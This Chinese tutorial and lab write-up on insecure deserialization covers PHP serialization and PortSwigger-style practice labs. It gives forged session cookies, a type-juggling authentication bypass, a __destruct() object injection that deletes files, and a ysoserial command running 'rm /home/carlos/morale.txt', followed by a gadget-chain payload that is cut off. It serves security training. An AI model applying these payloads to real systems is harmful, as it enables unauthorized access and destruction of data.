# 不安全的反序列化

**什么是序列化？**

**序列化**是将复杂数据结构（如对象及其字段）转换为"扁平化"格式的过程，这种格式可转换为连续的字节流，便于发送与接收。通过序列化数据，我们可以更便捷地实现以下操作：

- 将复杂数据写入进程间内存、文件或数据库
- 在网络传输、应用程序不同组件间通信或API调用时传递复杂数据

关键在于，序列化对象时其状态也会被持久化。换句话说，对象属性及其赋值都会被完整保留。



**反序列化**

**反序列化**是将字节流恢复为原始对象的完整功能副本的过程，其状态与序列化时完全一致。网站逻辑随后可与该反序列化对象交互，如同操作其他普通对象。



不安全反序列化指网站对用户可控数据进行反序列化处理。攻击者可借此篡改序列化对象，向应用代码注入有害数据。

攻击者甚至能以完全不同的类对象替换序列化对象。令人担忧的是，无论预期接收何种类，网站所有可用类的对象都将被反序列化并实例化。正因此，不安全反序列化有时被称为"对象注入"漏洞。

接收意外类对象可能引发异常，但此时损害往往已造成。许多基于反序列化的攻击在反序列化完成**前**即告终结。这意味着即便网站功能未直接与恶意对象交互，反序列化过程本身就可能触发攻击。



该漏洞通常源于对"反序列化用户可控数据"危险性的普遍认知缺失。理想情况下，应完全避免反序列化用户输入。



## 识别漏洞

无论采用白盒测试还是黑盒测试，识别不安全反序列化漏洞都相对简单。

在审计过程中，您应当审查所有传入网站的数据流，尝试识别任何呈现序列化数据特征的内容。若熟悉不同编程语言的序列化格式，识别这类数据将事半功倍。一旦发现序列化数据，即可测试其可控性。



### PHP序列化格式

PHP采用类自然语言的字符串序列化格式，字母表示数据类型，数字表示条目长度。例如某个包含以下属性的`User`对象：

```
$user->name = "carlos"; $user->isLoggedIn = true;
```

序列化后呈现如下形式：

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```



各字段含义解析：

- `O:4:"User"`：表示一个类名为`"User"`（4字符）的对象
- `2`：对象包含2个属性
- `s:4:"name"`：第一个属性的键是4字符字符串`"name"`
- `s:6:"carlos"`：第一个属性的值是6字符字符串`"carlos"`
- `s:10:"isLoggedIn"`：第二个属性的键是10字符字符串`"isLoggedIn"`
- `b:1`：第二个属性的布尔值为`true`



注：**不同 PHP 版本序列化后的呈现形式可能不同**，PHP原生序列化方法为`serialize()`与`unserialize()`。若具备源码访问权限，建议优先在代码中检索`unserialize()`方法并深入分析。



## 修改对象属性

某些反序列化漏洞的利用可能如同"改数据"般简单，攻击者只需篡改序列化对象中的特定属性值即可得手。由于对象状态采用持久化存储机制，攻击者可通过逆向分析序列化数据结构，精准定位并篡改核心参数（如权限标识位），随后借助系统的反序列化流程注入恶意对象。



在篡改数据时，只要攻击者保持有效的序列化对象结构，反序列化过程就会生成带有篡改属性值的服务端对象。以一个典型场景为例：某网站使用序列化的`User`对象将用户会话数据存储在cookie中。假设攻击者在HTTP请求中发现如下经过编码的序列化对象：

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czo3OiJpc0FkbWluIjtiOjA7fQ0K
```

```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```



假设网站通过该cookie校验用户是否具有管理员权限，其中 `isAdmin` 属性显然是关键攻击点。攻击者只需将该属性的布尔值改为`1`（真），重新编码对象并用此篡改值覆盖当前cookie即可。

```
$user = unserialize($_COOKIE); 
if ($user->isAdmin === true) { 
    // 允许访问管理界面 
}
```

这段存在漏洞的代码会根据cookie数据实例化`User`对象，包含攻击者篡改的`isAdmin`属性值。整个过程中系统从未验证序列化对象的真实性。篡改后的数据进入条件判断后，将直接导致权限提升漏洞。



**实验**

该实验室采用了基于序列化的会话机制，因此存在权限提升漏洞。要解决该实验，请通过修改会话Cookie中的序列化对象来利用此漏洞获取管理员权限，然后删除用户carlos。



在网站中输入账号密码后，使用 BurpSuite 抓取 HTTP 请求，查看其 Cookie 内容：

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3D
```



Cookie 内容使用 Base64 编码和 URL 编码，首先进行 URL 解码，再进行 Base64 解码后得到以下内容：

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

各字段含义解析：

- `O:4:"User"`：表示一个类名为`"User"`（4字符）的序列化对象
- `2`：对象包含2个属性
- `s:8:"username"`：第一个属性的键是8字符字符串`"username"`
- `s:6:"wiener"`：第一个属性的值是6字符字符串`"wiener"`
- `s:5:"admin"`：第二个属性的键是5字符字符串`"admin"`
- `b:0`：第二个属性的布尔值为`false`



要将服务器识别为用户权限为管理员，需修改User类中第二个属性"admin"的布尔值：将原始值false（对应0）更改为true（对应1）。修改后的序列化数据示例如下：

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```



修改后的反序列化数据需依次执行两步编码操作：首先对序列化字符串进行 **base64 编码**；接着对 base64 结果进行 **URL 编码**。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D
```



当携带未经篡改的标准 Cookie 值向服务器发起 **`/admin` 路径请求**时，服务器会返回 **HTTP 401 Unauthorized** 状态码（权限不足），证明当前身份未通过管理端鉴权。

```
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2587
```

![image-20250317112007108](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317112007108.png)



将篡改后的 Cookie 值替换原始数据并重新请求 **`/admin`** 路径后，服务器返回**管理员专属页面**（HTTP 200），验证了通过反序列化漏洞成功将用户权限提升为管理员。

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3104
```

![image-20250317112141810](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317112141810.png)



将 URL 路径修改为 `/admin/delete?username=carlos` 后重新发送 HTTP 请求，成功删除 carlos 用户。

![image-20250317112442252](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317112442252.png)



## 数据类型篡改

我们已了解如何修改序列化对象中的属性值，但攻击者还可能通过注入异常数据类型实施攻击。由于PHP松散比较运算符（`==`）在处理不同类型数据时的特殊行为，基于PHP的逻辑尤其容易受到此类篡改攻击。



当比较整型与字符串时，PHP会尝试将字符串转换为整型。例如，`5 == "5"`会被判定为`true`。值得注意的是，对于任何以数字开头的字母数字字符串，这种行为同样适用。此时PHP会将整个字符串转换为基于初始数字的整型值，后续字符会被完全忽略。因此，`5 == "5 of something"`实际上会被视为`5 == 5`。

更特殊的是，在PHP 7.x及更早版本中，`0 == "Example string"`的比对结果会被判定为`true`，因为PHP会将整个字符串视为整型`0`。



当这种松散比较运算符与反序列化对象中用户可控的数据结合使用时，就可能产生危险的逻辑漏洞：

```
$login = unserialize($_COOKIE);
if ($login['password'] == $password) { // 登录成功 }
```

假设攻击者将密码属性从字符串篡改为整型`0`。只要存储的真实密码不以数字开头，该条件将始终返回`true`，从而实现认证绕过。值得注意的是，这种攻击之所以可能，是因为反序列化过程会保留数据类型。若代码直接从请求中获取密码，`0`会被转换为字符串，此时条件判断将返回`false`。



**特别说明**

在PHP 8及更高版本中，`0 == "Example string"`的比对结果会被判定为`false`，因为PHP不再在比较时将字符串隐式转换为`0`。因此该漏洞在PHP 8+环境中不可复现。

但以数字开头的字母数字字符串比较行为在PHP 8中保持不变，即`5 == "5 of something"`仍然会被视为`5 == 5`。

需要特别注意的是，在修改任何序列化对象格式的数据类型时，务必记得同时更新序列化数据中的任何类型标签和长度指示符。否则序列化对象将损坏，导致反序列化失败。



**实验**

该实验室采用基于序列化的会话机制，因此存在身份验证绕过漏洞。要完成该实验，请编辑会话Cookie中的序列化对象以访问`administrator`管理员账户，随后删除用户`carlos`。

您可以使用以下凭证登录自己的账户：`wiener:peter`



在浏览器上登录账户后使用 BurpSuite 抓包查看 Cookie。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJiMjV0djVzMGpnZmRibGI1ZXNpdXN4aHpjbXpwMDMyOSI7fQ%3d%3d
```

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"b25tv5s0jgfdblb5esiusxhzcmzp0329";}
```



构造恶意的 Cookie，将 username 替换为 administrator，将 access_token 替换为整形 0，记得修改长度。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```



访问网站的 /admin 路径，并将 Cookie 设置为篡改后的。

![image-20250317155316338](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317155316338.png)



使用 BurpSuite 发送以下内容的 HTTP 请求即可删除 carlos 用户。

```
GET /admin/delete?username=carlos HTTP/2
Host: 0afd00f5037097f18078c10b00cb0007.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```



## 使用应用程序功能

除了简单地检查属性值之外，网站功能还可能对反序列化对象中的数据进行危险操作。在这种情况下，攻击者可以通过不安全的反序列化机制传入意外数据，并利用相关功能实施破坏。



例如，在某网站的"删除用户"功能中，系统会通过访问`$user->image_location`属性中的文件路径来删除用户的个人资料图片。如果这个`$user`对象是通过反序列化创建的，攻击者可以构造一个将`image_location`设置为任意文件路径的篡改对象。当他们删除自己的账户时，系统也会随之删除这个任意指定的文件。



**实验**

该实验室采用基于序列化的会话机制。某一功能会对序列化对象中提供的数据调用危险方法。要解决该实验室问题，请修改会话Cookie中的序列化对象，并利用它从Carlos的主目录中删除`morale.txt`文件。

您可以使用以下凭证登录自己的账户：`wiener:peter`

您还可以访问一个备份账户：`gregg:rosebud`



在浏览器上登录账户后使用 BurpSuite 抓包查看 Cookie。

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjdTJ1MHppazlua21mNnk1dGl1Y3ZzMGc5b2lhMnFvdCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30%3D
```

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"cu2u0zik9nkmf6y5tiucvs0g9oia2qot";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```



直接将 username 和 avatar_link 属性中的 wiener 替换为 carlos，token 保持不变，使用 BurpSuite 发送 HTTP 请求。

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjdTJ1MHppazlua21mNnk1dGl1Y3ZzMGc5b2lhMnFvdCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30%3D
```

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"cu2u0zik9nkmf6y5tiucvs0g9oia2qot";s:11:"avatar_link";s:19:"users/carlos/avatar";}
```



服务端返回 500 错误以及 PHP 的错误消息，错误消息中包含了 carlos 的真实 token。

```
PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username] = ibwhanrv502uul64mzn35af5n54o1z1v, $user-&gt;access_token = cu2u0zik9nkmf6y5tiucvs0g9oia2qot, $access_tokens = [ibwhanrv502uul64mzn35af5n54o1z1v, p4b76bemzfk4t07wubzd5rr1bnpk8el8, cu2u0zik9nkmf6y5tiucvs0g9oia2qot]) Invalid access token for user carlos in /var/www/index.php:8
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 8
```

用户 `carlos` 的 `access_token` 预期应为 `ibwhanrv502uul64mzn35af5n54o1z1v`（来自 `$access_tokens[$user->username]`）。

实际传入的 `$user->access_token` 是 `cu2u0zik9nkmf6y5tiucvs0g9oia2qot`，导致验证失败。

`$access_tokens` 数组包含三个令牌：

```
$access_tokens = [
  'ibwhanrv502uul64mzn35af5n54o1z1v',  // 用户 carlos 的令牌
  'p4b76bemzfk4t07wubzd5rr1bnpk8el8',  // 其他用户
  'cu2u0zik9nkmf6y5tiucvs0g9oia2qot'   // 其他用户
];
```



将 Cookie 中的 token 替换为 carlos 的 token 后重新发送 HTTP 请求，成功登录 carlos 账户。

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpYndoYW5ydjUwMnV1bDY0bXpuMzVhZjVuNTRvMXoxdiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30%3D
```

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"ibwhanrv502uul64mzn35af5n54o1z1v";s:11:"avatar_link";s:19:"users/carlos/avatar";}
```

![image-20250317131118418](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317131118418.png)



使用浏览器触发 Delete account 操作，通过 Burp Suite 拦截请求，获取 URL 路径，然后丢弃请求以防止账户被删除。

```
POST /my-account/delete HTTP/2
```



对象 **avatar_link** 属性存储用户头像存储的路径，当使用删除账号功能时，服务器会将用户的头像（即 **avatar_link** 属性中路径的文件）删除。只需要将 **avatar_link** 属性的内容设置为 **/home/carlos/morale.txt** ，服务器在删除用户时会一并删除该文件。

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpYndoYW5ydjUwMnV1bDY0bXpuMzVhZjVuNTRvMXoxdiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"ibwhanrv502uul64mzn35af5n54o1z1v";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

注：服务器在删除 avatar_link 路径中的文件时，并不会进行额外的校验。将 wiener 用户的 avatar_link 属性中的路径修改为 carlos 用户的文件（**/home/carlos/morale.txt**），在删除 wiener 用户时，服务器也会删除文件的。



此时只需要向删除账户的 URL 发送请求，并设置 Cookie 为篡改后的，即可删除当前用户，用户的文件 morale.txt 也会被一起删除。

```
POST /my-account/delete HTTP/2
Host: 0ac60091046b4c8680c8c610000b0075.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpYndoYW5ydjUwMnV1bDY0bXpuMzVhZjVuNTRvMXoxdiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```





## 魔术方法

魔术方法是一类无需显式调用的特殊方法。当特定事件或场景触发时，这些方法会自动执行。它们是面向对象编程（多种语言）中的常见特性，通常以双下划线（`__`）作为方法名的前缀或包裹符。



开发者可以通过在类中定义魔术方法，预先设定特定事件发生时需要执行的代码。不同魔术方法的触发时机和条件各不相同。例如，PHP 中的 `__construct()` 方法会在类的对象实例化时自动调用（类似于 Python 的 `__init__`），通常用于初始化实例属性。然而，开发者可以自由定制魔术方法中的代码逻辑。



魔术方法本身并不构成安全漏洞，但如果其执行的代码处理了攻击者可操控的数据（例如来自反序列化对象的数据），就可能引发风险。攻击者可利用此类特性，在满足条件时自动触发恶意方法。



**反序列化场景中的魔术方法**
 在此背景下，某些语言的魔术方法会在反序列化过程中被自动调用。例如：

- PHP 的 `unserialize()` 方法会查找并调用对象的 `__wakeup()` 魔术方法。



需重点关注包含此类魔术方法的类。它们允许在对象完全反序列化之前，将序列化数据传入网站代码中。这正是构造高阶漏洞利用的切入点。



## 任意对象注入攻击

通过简单地修改网站提供的序列化对象就有可能实现不安全的反序列化漏洞利用。但若能注入任意类型的对象，攻击者将获得更大的操作空间。

在面向对象编程中，对象可调用的方法由其所属类决定。因此，当攻击者能够控制反序列化过程中所传入对象的类时，就能直接影响反序列化期间及之后执行的代码逻辑。



反序列化方法通常不会对输入内容进行类型校验。这意味着只要网站类路径中存在可序列化的类，攻击者就可以构造该类的实例化对象进行反序列化操作。这种机制实质上允许攻击者创建任意类的实例——即使该对象类型与应用程序预期不符，也依然能够成功实例化。虽然非预期类型的对象可能会在后续应用逻辑中引发异常，但此时恶意对象早已完成初始化。

当攻击者掌握源代码时，可以深入研究所有可用类。为了构建基础攻击载荷，他们通常会寻找包含反序列化魔术方法（如__wakeup()、__destruct()等）的类，并核查这些方法是否会对可控数据执行危险操作。通过传入这类特殊构造的序列化对象，攻击者就能利用其魔术方法实现漏洞利用。

包含这类反序列化魔术方法的类还可以用于发起更复杂的攻击。攻击者通过构造多层级的方法调用链（称为"利用链"或"gadget chain"），能够将看似无害的操作串联成具有破坏性的攻击流程。这种攻击模式往往需要深入分析类与类之间的调用关系，最终形成多米诺骨牌式的漏洞触发链条。



**实验**

该实验采用基于序列化的会话机制，因此存在任意对象注入漏洞。为解决该实验，您需要创建并注入恶意序列化对象以删除Carlos主目录中的`morale.txt`文件。您需要获取源代码访问权限才能完成本实验。

您可以使用以下凭证登录自己的账户：`wiener:peter`



您有时可以通过在文件名后附加波浪号（`~`）来检索编辑器生成的备份文件，从而读取源代码。



登录账户，观察会话Cookie中包含一个序列化的PHP对象。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzZDkyaXY5eGU0d3Y4czB0czJzanRsNWR2dGsyN3V6OSI7fQ%3d%3d
```

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sd92iv9xe4wv8s0ts2sjtl5dvtk27uz9";}
```



在网站 **/my-account?id=wiener** 路径的源代码中，发现网站引用了文件`/libs/CustomTemplate.php`。

![image-20250317170042628](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317170042628.png)



通过在请求行的文件名后添加波浪号（`~`）可读取源代码。

```
https://xxxx/libs/CustomTemplate.php~
```

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

观察源代码中的 `CustomTemplate` 类包含 `__destruct()` 魔术方法。该方法会调用 `unlink()` 函数，从而删除该 `lock_file_path` 属性路径下的文件。



使用正确的PHP序列化语法创建一个`CustomTemplate`对象，将其`lock_file_path`属性设置为`/home/carlos/morale.txt`。确保数据类型标签和长度指示符正确。最终生成的对象应如下：

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```



如果你想在序列化字符串中包含 template_file_path 属性，则可以使用下面的字符串：

```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:0:"";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```



对该对象进行Base64编码和URL编码.

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D
```



在Burp Repeater中，用修改后的编码会话Cookie替换原始Cookie，请求路径为 **/my-account?id=wiener** 。发送请求。`__destruct()`魔术方法将自动触发，删除Carlos的文件。

```
GET /my-account?id=wiener HTTP/2
Host: 0a2000a7033a4f5c80ec8a67003a000c.web-security-academy.net
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D
```



## Gadget Chains

"小工具"（Gadget）指应用程序中存在的代码片段，攻击者可利用其实现特定目标。单个小工具可能不会直接通过用户输入执行有害操作，但攻击者的目标可能是调用某个方法，将其输入传递至另一个小工具。通过将多个小工具按此方式链式调用，攻击者最终可能将其输入传递到危险的"接收器小工具"（sink gadget），从而造成最大破坏。

需注意，与其他漏洞利用方式不同，小工具链并非由攻击者自行构造的链式方法载荷。**所有代码均已存在于网站中**，攻击者唯一控制的是传入小工具链的数据。这通常通过反序列化期间触发的"魔法方法"（magic method）实现，这类方法有时称为"启动小工具"（kick-off gadget）。



**实际应用**

实际场景中，许多不安全的反序列化漏洞只能通过小工具链利用。有些情况下可能只需简单的一两步链式调用，但构造高危害攻击通常需要更复杂的对象实例化和方法调用序列。因此，成功利用不安全反序列化的关键之一就是构建有效的小工具链。



**使用预构建的小工具链**

手动识别小工具链可能极其耗时，若无法访问源代码则几乎不可能。幸运的是，可优先尝试使用现成的小工具链工具。

现有多种工具提供了在其它网站成功利用的预发现链式调用模板。即使无法获取源代码，也能通过这些工具轻松识别和利用不安全的反序列化漏洞。这种方法的可行性源于广泛使用的库中常包含可被利用的小工具链。例如，若某网站利用 Java 的 Apache Commons Collections 库中的小工具链，则任何使用该库的网站都可能通过相同链式调用被攻击。



### Java

ysoserial 支持选择目标应用可能使用的库对应的预置小工具链，并注入待执行的命令，最终生成基于所选链的序列化对象。虽然仍需试错，但远比手动构造链式调用高效。



**实验**

本实验采用基于序列化的会话机制，并加载了Apache Commons Collections库。虽然您无法访问源代码，但仍可通过预构建的gadget链进行漏洞利用。

使用第三方工具生成包含远程代码执行（RCE）负载的恶意序列化对象，然后通过网站调用该对象，从Carlos的主目录中删除morale.txt文件。

您可以使用以下凭据登录到自己的账户： `wiener:peter`



登录到您自己的账户，并观察到会话 cookie 包含一个序列化的 Java 对象。将包含您会话 cookie 的请求发送到 Burp Repeater。

```
Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBjN2ltcTJhMDY1bW1xbTAwOTZ2MDlrenMyMGlhMTVleXQABndpZW5lcg%3d%3d
```



下载“ysoserial”工具并执行以下命令。这将生成一个包含您有效负载的 Base64 编码序列化对象：

```
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

- 在 Java 15 及以下版本中



将整个 cookie 进行 URL 编码。

```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci%2F5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB%2BAAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo%2FpQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2BkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD%2F%2F%2F%2F%2FdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAABqrK%2Frq%2BAAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY